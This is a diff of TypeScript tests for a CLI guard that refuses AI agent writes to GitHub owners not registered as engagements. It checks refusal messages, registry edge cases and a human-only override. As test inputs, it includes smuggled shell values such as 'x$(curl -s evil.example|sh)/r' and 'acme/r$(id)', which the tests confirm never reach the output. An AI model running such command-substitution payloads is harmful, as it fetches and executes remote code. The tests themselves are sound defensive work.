@@ -358,6 +358,237 @@ describe("egress-check (subprocess)", { skip: cliBuilt() ? false : "CLI not buil
   });
 });
 
+// Rule h at the shim layer (issue #151): the same decision, the same code, the
+// same refusal text as the agent hook.
+describe("egress-check — rule h: unregistered owner (subprocess)", { skip: cliBuilt() ? false : "CLI not built" }, () => {
+  const OWNERS_REGISTRY =
+    "schemaVersion: 2\n" +
+    "personalOrgs: [acme]\n" +
+    "engagements:\n" +
+    "  - id: customer-a\n" +
+    "    name: Customer A\n" +
+    "    started: '2026-01-01'\n" +
+    "    markers: []\n" +
+    "    githubOrgs: [customer-a-org]\n";
+  const REGISTERED = ["acme", "customer-a-org", "customer-a", "Customer A"];
+  const STRANGER_ISSUE = ["egress-check", "--", "issue", "create", "--repo", "stranger/repo", "--body", "x"];
+
+  function registryHome(name: string, registry?: string): string {
+    const dir = join(root, name);
+    mkdirSync(join(dir, "markers"), { recursive: true });
+    writeFileSync(join(dir, "markers", "_always.txt"), "");
+    if (registry !== undefined) writeFileSync(join(dir, "engagements.yaml"), registry);
+    return dir;
+  }
+
+  interface Refusal {
+    code: string;
+    error: string;
+    details: { verb: string; destination?: { org: string; repo: string } };
+  }
+
+  it("denies a write to an unregistered owner with the five-part refusal, naming no registered owner", () => {
+    const h = registryHome("h-owners", OWNERS_REGISTRY);
+    const r = runCli(h, privateRepo, STRANGER_ISSUE);
+    assert.equal(r.code, 2, r.stdout);
+    const p = JSON.parse(r.stderr.trim()) as Refusal;
+    assert.equal(p.code, "UNREGISTERED_OWNER_EGRESS");
+    assert.equal(p.details.verb, "gh issue create");
+    assert.equal(p.details.destination?.org, "stranger");
+    assert.match(p.error, /^gh issue create → stranger\/repo: refused\./);
+    assert.match(p.error, /No approval covers this/);
+    assert.match(p.error, /a person runs, from a terminal: repo-aegis engagements add --personal-org stranger/);
+    assert.match(p.error, /\[UNREGISTERED_OWNER_EGRESS, see doc\/agent-guide\.md#unregistered_owner_egress\]/);
+    for (const bad of REGISTERED) assert.ok(!r.stderr.includes(bad), `must not contain "${bad}"`);
+  });
+
+  it("a `*`, `stranger/*` and `stranger/repo` approval each fail to help", () => {
+    for (const [i, target] of [
+      { org: "*", repo: "*" },
+      { org: "stranger", repo: "*" },
+      { org: "stranger", repo: "repo" },
+    ].entries()) {
+      const h = registryHome(`h-approved-${i}`, OWNERS_REGISTRY);
+      mintApproval({ target, path: approvalsPath(h) });
+      const r = runCli(h, privateRepo, STRANGER_ISSUE);
+      assert.equal(r.code, 2, JSON.stringify(target));
+      assert.equal((JSON.parse(r.stderr.trim()) as Refusal).code, "UNREGISTERED_OWNER_EGRESS", JSON.stringify(target));
+    }
+  });
+
+  it("a registered owner is unaffected", () => {
+    const h = registryHome("h-registered", OWNERS_REGISTRY);
+    const r = runCli(h, privateRepo, ["egress-check", "--", "issue", "create", "--repo", "acme/internal", "--body", "x"]);
+    // acme/internal is this machine's declared-private checkout: allowed, as before.
+    assert.equal(r.code, 0, r.stderr);
+  });
+
+  it("an unreadable registry (corrupt YAML) refuses, and says it could not be read", () => {
+    const h = registryHome("h-corrupt", "engagements: [\n");
+    const r = runCli(h, privateRepo, STRANGER_ISSUE);
+    assert.equal(r.code, 2, r.stdout);
+    const p = JSON.parse(r.stderr.trim()) as Refusal;
+    assert.equal(p.code, "UNREGISTERED_OWNER_EGRESS");
+    assert.match(p.error, /could not be read/);
+    assert.match(p.error, /repair/);
+  });
+
+  it("an encrypted registry (ciphertext only) refuses", () => {
+    const h = registryHome("h-encrypted");
+    writeFileSync(join(h, "engagements.yaml.age"), "age-encryption.org/v1\n");
+    const r = runCli(h, privateRepo, STRANGER_ISSUE);
+    assert.equal(r.code, 2, r.stdout);
+    assert.equal((JSON.parse(r.stderr.trim()) as Refusal).code, "UNREGISTERED_OWNER_EGRESS");
+  });
+
+  it("no registry file: rule h is skipped (the unknown destination is stopped by rule g instead)", () => {
+    const h = registryHome("h-missing");
+    const r = runCli(h, privateRepo, STRANGER_ISSUE);
+    assert.equal(r.code, 2, r.stdout);
+    assert.equal((JSON.parse(r.stderr.trim()) as Refusal).code, "PUBLIC_EGRESS_NEEDS_HUMAN");
+  });
+
+  it("a registry that declares no owners: rule h is skipped", () => {
+    const h = registryHome("h-no-owners", "schemaVersion: 2\nengagements: []\n");
+    const r = runCli(h, privateRepo, STRANGER_ISSUE);
+    assert.equal(r.code, 2, r.stdout);
+    assert.equal((JSON.parse(r.stderr.trim()) as Refusal).code, "PUBLIC_EGRESS_NEEDS_HUMAN");
+  });
+
+  it("a registry from a newer schema is unreadable, so it refuses too (the hook has the same case)", () => {
+    const h = registryHome("h-newer", "schemaVersion: 99\nengagements: []\n");
+    const r = runCli(h, privateRepo, STRANGER_ISSUE);
+    assert.equal(r.code, 2, r.stdout);
+    const p = JSON.parse(r.stderr.trim()) as Refusal;
+    assert.equal(p.code, "UNREGISTERED_OWNER_EGRESS");
+    assert.match(p.error, /could not be read/);
+  });
+
+  it("a hostile owner name never reaches the refusal or its details (review M2)", () => {
+    const h = registryHome("h-hostile", OWNERS_REGISTRY);
+    const r = runCli(h, privateRepo, [
+      "egress-check",
+      "--",
+      "issue",
+      "create",
+      "--repo",
+      "x$(curl -s evil.example|sh)/r",
+      "--body",
+      "x",
+    ]);
+    assert.equal(r.code, 2, r.stdout);
+    const p = JSON.parse(r.stderr.trim()) as Refusal;
+    assert.equal(p.code, "UNREGISTERED_OWNER_EGRESS");
+    assert.equal(p.details.destination, undefined);
+    assert.match(p.error, /not a valid GitHub owner\/repo/);
+    for (const frag of ["evil.example", "$(", "engagements add", "repo-aegis approve"]) {
+      assert.ok(!r.stderr.includes(frag), `must not contain "${frag}"`);
+    }
+  });
+
+  describe("the verdict says whether rule h judged or was skipped (D4)", () => {
+    type Verdict = { ruleH?: string };
+    type Denial = { code: string; details: Verdict };
+    // Allowed with nobody present: a destination this machine records as private.
+    const OWN_PRIVATE = ["egress-check", "--", "issue", "create", "--repo", "acme/internal", "--body", "x"];
+    const human = (h: string, args: string[]) =>
+      withEnv("REPO_AEGIS_EGRESS_HUMAN", "1", () => runCli(h, privateRepo, args));
+
+    it("applied: a registry with owners, on an allow and on a refusal", () => {
+      const h = registryHome("h-verdict-applied", OWNERS_REGISTRY);
+      const r = runCli(h, privateRepo, OWN_PRIVATE);
+      assert.equal(r.code, 0, r.stderr);
+      assert.equal((JSON.parse(r.stdout) as Verdict).ruleH, "applied");
+      const refused = runCli(h, privateRepo, STRANGER_ISSUE);
+      assert.equal((JSON.parse(refused.stderr.trim()) as Denial).details.ruleH, "applied");
+    });
+
+    it("skipped:missing: no registry file, on an allow and on a deny", () => {
+      const h = registryHome("h-verdict-missing");
+      assert.equal((JSON.parse(runCli(h, privateRepo, OWN_PRIVATE).stdout) as Verdict).ruleH, "skipped:missing");
+      const denied = runCli(h, privateRepo, STRANGER_ISSUE);
+      assert.equal((JSON.parse(denied.stderr.trim()) as Denial).details.ruleH, "skipped:missing");
+    });
+
+    it("skipped:no-owners: a registry that declares none", () => {
+      const h = registryHome("h-verdict-no-owners", "schemaVersion: 2\nengagements: []\n");
+      assert.equal((JSON.parse(runCli(h, privateRepo, OWN_PRIVATE).stdout) as Verdict).ruleH, "skipped:no-owners");
+    });
+
+    it("omitted when a person is present (allow verdict), as in the hook", () => {
+      for (const [name, registry] of [
+        ["h-verdict-human-owners", OWNERS_REGISTRY],
+        ["h-verdict-human-missing", undefined],
+      ] as const) {
+        const h = registryHome(name, registry);
+        const r = human(h, STRANGER_ISSUE);
+        assert.equal(r.code, 0, r.stderr);
+        const v = JSON.parse(r.stdout) as Verdict;
+        assert.equal("ruleH" in v, false, `${name}: ${r.stdout}`);
+      }
+    });
+
+    it("omitted when a shape rule denied: rule h was never reached", () => {
+      for (const [name, registry] of [
+        ["h-verdict-shape-owners", OWNERS_REGISTRY],
+        ["h-verdict-shape-missing", undefined],
+      ] as const) {
+        const h = registryHome(name, registry);
+        const r = runCli(h, privateRepo, ["egress-check", "--", "issue", "create", "--body-file", "rel.md", "--repo", "stranger/repo"]);
+        assert.equal(r.code, 2, r.stdout);
+        const p = JSON.parse(r.stderr.trim()) as Denial;
+        assert.equal(p.code, "PAYLOAD_MODE_DEPENDENT_PATH");
+        assert.equal("ruleH" in p.details, false, `${name}: ${r.stderr}`);
+      }
+    });
+
+    it("a command with no egress intent stays a bare allow", () => {
+      const h = registryHome("h-verdict-read", OWNERS_REGISTRY);
+      const r = runCli(h, privateRepo, ["egress-check", "--", "pr", "view", "1"]);
+      assert.deepEqual(JSON.parse(r.stdout), { action: "allow" });
+    });
+
+    it("the verdict never lists registry contents", () => {
+      const h = registryHome(
+        "h-verdict-contents",
+        "schemaVersion: 2\nengagements:\n  - id: customer-b\n    name: Customer B\n    started: '2026-01-01'\n    markers: []\n",
+      );
+      const denied = runCli(h, privateRepo, STRANGER_ISSUE);
+      assert.equal((JSON.parse(denied.stderr.trim()) as Denial).details.ruleH, "skipped:no-owners");
+      assert.ok(!denied.stderr.includes("customer-b") && !denied.stderr.includes("Customer B"), denied.stderr);
+    });
+  });
+
+  describe("a destination name that is not a GitHub name never reaches the JSON (re-review)", () => {
+    const hostileArgs = (repo: string) => ["egress-check", "--", "issue", "create", "--repo", repo, "--body", "x"];
+
+    it("a registered owner with a hostile repo: the rule g deny drops the destination and the approve hint", () => {
+      const h = registryHome("h-hostile-repo", OWNERS_REGISTRY);
+      const r = runCli(h, privateRepo, hostileArgs("acme/r$(id)"));
+      assert.equal(r.code, 2, r.stdout);
+      const p = JSON.parse(r.stderr.trim()) as { code: string; error: string; details: { destination?: unknown } };
+      assert.equal(p.code, "PUBLIC_EGRESS_NEEDS_HUMAN");
+      assert.equal(p.details.destination, undefined);
+      assert.ok(!r.stderr.includes("$(id)") && !r.stderr.includes("repo-aegis approve"), r.stderr);
+    });
+
+    it("a bidi control character in the repo is dropped the same way", () => {
+      const h = registryHome("h-bidi-repo", OWNERS_REGISTRY);
+      const r = runCli(h, privateRepo, hostileArgs("acme/r\u202Egpj"));
+      assert.equal(r.code, 2, r.stdout);
+      assert.ok(!r.stderr.includes("\u202E") && !r.stderr.includes("\\u202e"), JSON.stringify(r.stderr));
+      assert.equal((JSON.parse(r.stderr.trim()) as { details: { destination?: unknown } }).details.destination, undefined);
+    });
+  });
+
+  it("a person present passes rule h (REPO_AEGIS_EGRESS_HUMAN, the human-only escape)", () => {
+    const h = registryHome("h-human", OWNERS_REGISTRY);
+    const r = withEnv("REPO_AEGIS_EGRESS_HUMAN", "1", () => runCli(h, privateRepo, STRANGER_ISSUE));
+    assert.equal(r.code, 0, r.stderr);
+    assert.equal((JSON.parse(r.stdout) as { action: string }).action, "allow");
+  });
+});
+
 describe("egress-readback", () => {
   const SEEDED = "The body that was actually published.\n";
 
